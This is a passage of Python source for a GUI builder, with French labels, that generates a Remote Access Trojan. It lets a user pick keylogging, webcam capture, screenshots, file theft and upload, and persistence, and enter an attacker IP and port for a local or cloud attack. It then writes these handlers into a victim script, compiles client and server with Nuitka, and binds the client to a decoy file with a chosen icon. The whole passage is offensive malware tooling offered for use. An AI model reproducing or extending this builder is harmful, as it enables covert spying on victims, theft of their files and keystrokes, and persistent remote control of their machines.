            "Capture d'ecran": "Prend des captures d'ecran a intervalles reguliers.",
            "Recuperation des fichiers": "Telecharge les fichiers specifiques depuis la cible.",
            "Transmettre des fichiers": "Permet d'envoyer des fichiers vers la cible.",
            "Persistance": "Implemente la persistance pour maintenir l'acces.",
            
        }

        self.selected_options = {}
        for option, description in self.options.items():
            var = ctk.BooleanVar()
            checkbox = ctk.CTkCheckBox(self.inner_frame, text=option, variable=var,
                                       font=("Arial", 14), text_color="white",
                                       command=lambda o=option, d=description: self.show_description(o, d))
            checkbox.pack(anchor="w", pady=5)
            self.selected_options[option] = var

        self.description_label = ctk.CTkLabel(self.inner_frame, text="Selectionnez une option pour voir sa description.",
                                              font=("Arial", 14), text_color="gray")
        self.description_label.pack(pady=15)

        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Precedent", font=("Arial", 16),
                      command=lambda: controller.show_page("NetworkSettingsPage")).pack(side="left", padx=10)

        # Creer un bouton qui appelle la methode handle_button_click
        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=lambda:[self.save_and_create_file(), controller.show_page("FileSelectionPage") ]).pack(side="right", padx=20)

    def show_description(self, option, description):
        """Affiche la description de l'option selectionnee."""
        self.description_label.configure(text=f"{option} : {description}")

        
    def save_and_create_file(self):
        selected = [option for option, var in self.selected_options.items() if var.get()]
        if not selected:
            messagebox.showwarning("Avertissement", "Veuillez selectionner au moins une option.")
            return
        create_victim_script1()
        NetworkSettingsPage.recup_ip_port(self.controller.user_choices)
        add_code_to_victim_script2()
        # Ajouter le code correspondant aux options selectionnees dans victim.py
        for option in selected:
            if option == "Keylogger":
                self.add_keylogger_code_to_victim_script()
            elif option == "Ouvrir la webcam":
                self.add_camera_code_to_victim_script()
            elif option == "Capture d'ecran":
                self.add_screenshot_code_to_victim_script()
            elif option == "Recuperation des fichiers":
                self.add_download_code_to_victim_script()
            elif option == "Transmettre des fichiers":
                self.add_upload_code_to_victim_script()
            elif option == "Persistance":
                self.add_persistence_code_to_victim_script()
        add_code_to_victim_script()
        create_server_1()
        NetworkSettingsPage.recup_ip_port2(self.controller.user_choices)
        self.controller.user_choices["options"] = selected
    
    def add_keylogger_code_to_victim_script(self):
        keylogger_code = """
            elif command.startswith("keylogger"):
                handle_keylogger_command(command)
                continue
            """
        self.append_code_to_victim_script(keylogger_code)
    
    def add_camera_code_to_victim_script(self):
        """
        Ajouter le code pour activer la webcam dans victim.py.
        """
        camera_code = """
            elif command.strip() == "camera":
                camera_handler()
                continue
            """
        self.append_code_to_victim_script(camera_code)
    
    def add_screenshot_code_to_victim_script(self):
        screenshot_code = """
            elif command.strip() == "screenshot":
                screenshot_handler()
                continue
            """
        self.append_code_to_victim_script(screenshot_code)


    def add_download_code_to_victim_script(self):
        download_code = """
            elif command.startswith("download "):
                download_file(command)
                continue
            """
        self.append_code_to_victim_script(download_code)


    def add_persistence_code_to_victim_script(self):
        persistence_code = """
            elif command.strip() == "persistance":
                response = add_persistence()
                sending(response)
                continue
            """
        self.append_code_to_victim_script(persistence_code)

    def add_upload_code_to_victim_script(self):
        upload_code = """
            elif command.startswith("upload "):
                upload_handler(command)
                continue
            """
        self.append_code_to_victim_script(upload_code)


    def append_code_to_victim_script(self, code):
        """
        Ajouter un bloc de code dans le fichier victim.py.
        """
        with open("client1.py", "a") as file:
            file.write(code)
        

class FileSelectionPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        # Titre de la page
        ctk.CTkLabel(self.inner_frame, text="Sélectionner un fichier pour l'injection",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        # Label pour afficher le fichier sélectionné
        self.file_label = ctk.CTkLabel(self.inner_frame, text="Aucun fichier sélectionné",
                                       font=("Arial", 16), text_color="gray")
        self.file_label.pack(pady=10)

        # Bouton pour choisir un fichier
        ctk.CTkButton(self.inner_frame, text="Choisir un fichier", font=("Arial", 16),
                      command=self.choose_file).pack(pady=10)

        # Espacement pour pousser les boutons vers le bas
        ctk.CTkFrame(self.inner_frame).pack(fill="both", expand=True)

        # Boutons de navigation en bas du cadre
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(side="bottom", fill="x", pady=10)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("OptionsPage")).pack(side="left", padx=10)
        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=self.save_and_next).pack(side="right", padx=10)


    def save_and_next(self):
        if not self.controller.user_choices["file_to_inject"]:
            messagebox.showwarning("Avertissement", "Veuillez selectionner le fichier a injecter.")
            return
        
        
        self.controller.show_page("OutputPage")

    def choose_file(self):
        file_path = filedialog.askopenfilename(title="Choisir un fichier")
        if file_path:
            self.controller.user_choices["file_to_inject"] = file_path
            # Tronquer le chemin complet pour l'affichage
            truncated_path = self.truncate_filepath(file_path)
            self.file_label.configure(text=f"Fichier selectionne : {truncated_path}", text_color="white")

    def truncate_filepath(self, file_path, max_length=40):
        """
        Tronque le chemin complet du fichier si nécessaire et ajoute des points de suspension au milieu.
        :param file_path: Le chemin complet du fichier.
        :param max_length: La longueur maximale du texte affiché.
        :return: Le chemin tronqué.
        """
        if len(file_path) <= max_length:
            return file_path  # Pas besoin de tronquer

        # Calculer la longueur de chaque partie (début et fin)
        part_length = (max_length - 3) // 2  # On soustrait 3 pour les points de suspension
        start = file_path[:part_length]
        end = file_path[-part_length:]

        # Retourner le chemin tronqué avec des points de suspension au milieu
        return f"{start}...{end}"

class NetworkSettingsPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Parametres Reseau",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        # Adresse IP
        ctk.CTkLabel(self.inner_frame, text="Adresse IP(local :l'attaque dans le meme Lan , public :l'attaque dans le Cloud)", font=("Arial", 14)).pack(pady=5)
        self.ip_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
        self.ip_entry.insert(0, self.controller.user_choices["ip_address"])
        self.ip_entry.pack(pady=5)

        # Port
        ctk.CTkLabel(self.inner_frame, text="Port :", font=("Arial", 14)).pack(pady=5)
        self.port_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="8080")
        self.port_entry.insert(0, str(self.controller.user_choices["port"]))
        self.port_entry.pack(pady=5)

       # Adresse IP
        ctk.CTkLabel(self.inner_frame, text="Adresse IP local :", font=("Arial", 14)).pack(pady=5)
        self.ip2_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
        self.ip2_entry.insert(0, self.controller.user_choices["ip_address2"])
        self.ip2_entry.pack(pady=5)
       
        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Precedent", font=("Arial", 16),
                      command=lambda: controller.show_page("IntroductionPage")).pack(side="left", padx=10)

        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=self.save_and_next).pack(side="right", padx=10)

    def select_encryption(self, method):
        self.controller.user_choices["encryption_method"] = method

    def save_and_next(self):
        self.controller.user_choices["ip_address"] = self.ip_entry.get()
        self.controller.user_choices["ip_address2"] = self.ip2_entry.get()
        self.controller.user_choices["port"] = int(self.port_entry.get())
        self.controller.show_page("OptionsPage")
        
    @staticmethod
    def recup_ip_port(controller_user_choices):
        ip_address = controller_user_choices.get("ip_address")
        port = controller_user_choices.get("port")
        if ip_address and port:
            add_ip_and_port_to_victim_script(ip_address, port)
        else:
            print("IP ou Port non definis.")
        

    @staticmethod
    def recup_ip_port2(controller_user_choices):
        port = controller_user_choices.get("port")
        ip_address2 = controller_user_choices.get("ip_address2")
        if ip_address2 and port:
            create_server_2(ip_address2, port)
        else:
            print("IP ou Port non definis.")


class WaitingPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        # Label principal
        self.label = ctk.CTkLabel(self.inner_frame, text="Veuillez patienter...", font=("Arial", 24, "bold"), text_color="lightblue")
        self.label.pack(pady=20)

        # Barre de progression
        self.progress_bar = CTkProgressBar(self.inner_frame, mode="indeterminate")  # Mode indéterminé pour une animation continue
        self.progress_bar.pack(pady=20)

        # Démarrer l'animation de la barre de progression
        self.start_animation()

    def start_animation(self):
        """Démarre l'animation de la barre de progression."""
        self.progress_bar.start()  # Démarre l'animation de la barre de progression
        self.running = True

    def stop_animation(self):
        """Arrête l'animation de la barre de progression."""
        self.running = False
        self.progress_bar.stop()  # Arrête l'animation de la barre de progression
        

class OutputPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Emplacement de stockage",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        self.output_label = ctk.CTkLabel(self.inner_frame, text="Aucun emplacement selectionne",
                                         font=("Arial", 16), text_color="gray")
        self.output_label.pack(pady=10)

        ctk.CTkButton(self.inner_frame, text="Choisir un emplacement", font=("Arial", 16),
                      command=self.choose_output).pack(pady=10)
        self.icon_label = ctk.CTkLabel(self.inner_frame, text="Aucune icône selectionne",
                                         font=("Arial", 16), text_color="gray")
        self.icon_label.pack(pady=10)
        ctk.CTkButton(self.inner_frame, text="Choisir une icône", font=("Arial", 16),
                      command=self.choose_icon).pack(pady=10)
        
        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Precedent", font=("Arial", 16),
                      command=lambda: controller.show_page("FileSelectionPage")).pack(side="left", padx=10)

        ctk.CTkButton(button_frame, text="Generer", font=("Arial", 16),
                      command=self.save_and_next).pack(side="right", padx=10)

    def choose_output(self):
        output_path = filedialog.askdirectory(title="Choisir un emplacement de stockage")
        if output_path:
            self.controller.user_choices["output_path"] = output_path
            truncated_path = self.truncate_filepath(output_path)
            self.output_label.configure(text=f"Emplacement selectionne : {truncated_path}", text_color="white")

    def choose_icon(self):
        # Ouvre une boite de dialogue pour selectionner une icône (fichier .ico).
        file_path = filedialog.askopenfilename(
            title="Choisir une icône",
            filetypes=[("Fichiers d'icônes", "*.ico"), ("Tous les fichiers", "*.*")]
        )
        if file_path:
            self.controller.user_choices["icon_path"] = file_path  # Stocke le chemin dans user_choices
            truncated_path = self.truncate_filepath(file_path)
            self.icon_label.configure(text=f"Icône selectionnee : {truncated_path}", text_color="white")
    
    def generate_rat(self):
        if not self.controller.user_choices["output_path"]:
            messagebox.showwarning("Avertissement", "Veuillez selectionner un emplacement de stockage.")
            return

        options = ", ".join(self.controller.user_choices["options"])
        file_to_inject = self.controller.user_choices["file_to_inject"]
        extension = self.controller.user_choices["extension"]
        output_path = self.controller.user_choices["output_path"]
        ip_address = self.controller.user_choices["ip_address"]
        port = self.controller.user_choices["port"]

        messagebox.showinfo(
            "Succes",
            f"RAT genere avec succes !\n\nOptions : {options}\nExtension : {extension}\n"
            f"Fichier injecte : {file_to_inject}\nIP : {ip_address}\nPort : {port}\n"
            f"Stocke dans : {output_path}"
        )

    def truncate_filepath(self, file_path, max_length=40):
        """
        Tronque le chemin complet si nécessaire et ajoute des points de suspension au milieu.
        :param file_path: Le chemin complet du fichier ou dossier.
        :param max_length: La longueur maximale du texte affiché.
        :return: Le chemin tronqué.
        """
        if len(file_path) <= max_length:
            return file_path  # Pas besoin de tronquer

        # Calculer la longueur de chaque partie (début et fin)
        part_length = (max_length - 3) // 2  # On soustrait 3 pour les points de suspension
        start = file_path[:part_length]
        end = file_path[-part_length:]

        # Retourner le chemin tronqué avec des points de suspension au milieu
        return f"{start}...{end}"

    def save_and_next(self):
        # Passer a la page WaitingPage
        if not self.controller.user_choices["output_path"]:
            messagebox.showwarning("Avertissement", "Veuillez selectionner le chemin de stockage.")
            return
        if not self.controller.user_choices["icon_path"]:
            messagebox.showwarning("Avertissement", "Veuillez selectionner une icone.")
            return
        self.controller.show_page("WaitingPage")

        # Lancer la tache en arriere-plan
        def background_task():
            try:
                # Obtenir les chemins complets des fichiers
                client_path = os.path.join(os.getcwd(), "client1.py")
                server_path = os.path.join(os.getcwd(), "server1.py")
                
                print(f"Chemin de client1.py : {client_path}")
                print(f"Chemin de server1.py : {server_path}")

                # Créer l'exécutable pour client1.py
                exe_name = "client1.exe"
                
                create_exe_with_nuitka(client_path, exe_name)
                
                exe_name1 = "server1.exe"
                
                create_exe_with_nuitka(server_path, exe_name1)
                

                # Chemin de l'exécutable client1.exe
                client_exe_path = os.path.join(os.getcwd(), "client1.exe")

                # Binder les fichiers
                bind_files(
                    self.controller.user_choices["file_to_inject"],
                    client_exe_path,
                    self.controller.user_choices["icon_path"],
                    self.controller.user_choices["output_path"]
                )

                # Afficher la page de sortie
                self.controller.show_page("OutputPage")

                # Générer le message de succès
                self.generate_rat()

            except Exception as main_error:
                print(f"Error: {main_error}")
                messagebox.showerror("Erreur", f"Une erreur s'est produite : {main_error}")

            self.controller.show_page("OutputPage")

        # Lancer le thread
        thread = threading.Thread(target=background_task)
        thread.start()

if __name__ == "__main__":
    app = Application()
    app.mainloop()